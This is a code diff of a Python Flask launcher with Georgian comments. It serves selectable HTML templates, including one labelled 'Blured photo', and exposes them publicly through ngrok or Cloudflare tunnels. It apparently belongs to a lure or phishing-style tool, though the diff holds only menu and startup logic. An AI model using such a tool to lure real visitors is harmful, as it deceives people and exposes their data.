@@ -8,7 +8,6 @@ from flask_cors import CORS
 import flask.cli
 from colorama import Fore, Style, init
 
-
 try:
     from routes import web
     from utils import run_cloudflare, run_ngrok
@@ -42,9 +41,9 @@ log.setLevel(logging.ERROR)
 PORT = 7878
 app = Flask(__name__)
 CORS(app)
-web(app) 
 
 def start_flask():
+    # სერვერი ეშვება იმ პარამეტრებით, რაც უკვე დაურეგისტრირდა
     app.run(host="0.0.0.0", port=PORT, debug=False, use_reloader=False)
 
 print(Fore.CYAN + r"""
@@ -65,11 +64,11 @@ print(f"  {Fore.GREEN}2.{Fore.WHITE} Cloudflare")
 try:
     choice = input(f"\n{Style.BRIGHT}choice > {Style.RESET_ALL}").strip()
     
-    print(f"{Fore.YELLOW}[*] Starting Flask server on port {PORT}...")
-    threading.Thread(target=start_flask, daemon=True).start()
-    time.sleep(2)
+    # ცვლადი, სადაც შევინახავთ არჩეულ HTML ფაილს
+    selected_template = "index1.html" 
 
     if choice == "1":
+        # Ngrok-ის არჩევის შემთხვევაშიც შეგვიძლია დავამატოთ შაბლონის არჩევა, თუ გინდა
         if not token:
             print(f"{Fore.RED}[!] No ngrok token found.")
             token = edit_token()
@@ -81,20 +80,42 @@ try:
         
         if choice1 == "1":
             token = edit_token()
-            run_ngrok(PORT, token)
-        else:
-            run_ngrok(PORT, token)
 
     elif choice == "2":
-        run_cloudflare(PORT)
+        print(f"  {Fore.GREEN}1.{Fore.WHITE} Default template (index1.html)")
+        print(f"  {Fore.GREEN}2.{Fore.WHITE} Blured photo (index2.html)")
+
+
+        template_choice = input(f"\n{Style.BRIGHT}choice template > {Style.RESET_ALL}").strip()
+        if template_choice == "1":
+            selected_template = "index1.html"
+        elif template_choice == "2":
+            selected_template = "index2.html"
+        else:
+            print(f"{Fore.RED}[!] Invalid template choice.")
+            sys.exit()
     else:
         print(f"{Fore.RED}[!] Invalid choice. Exiting...")
         sys.exit()
 
+
+    web(app, selected_template) 
+    
+
+    print(f"{Fore.YELLOW}[*] Starting Flask server on port {PORT}...")
+    threading.Thread(target=start_flask, daemon=True).start()
+    time.sleep(2)
+
+
+    if choice == "1":
+        run_ngrok(PORT, token)
+    elif choice == "2":
+        run_cloudflare(PORT)
+        
     print(f"{Fore.RED}{Style.BRIGHT}[*] Press Ctrl + C to stop\n")
 
     while True:
-        time.sleep(10)
+       time.sleep(10)
 
 except KeyboardInterrupt:
     print(f"\n{Fore.RED}[!] Shutdown requested...")
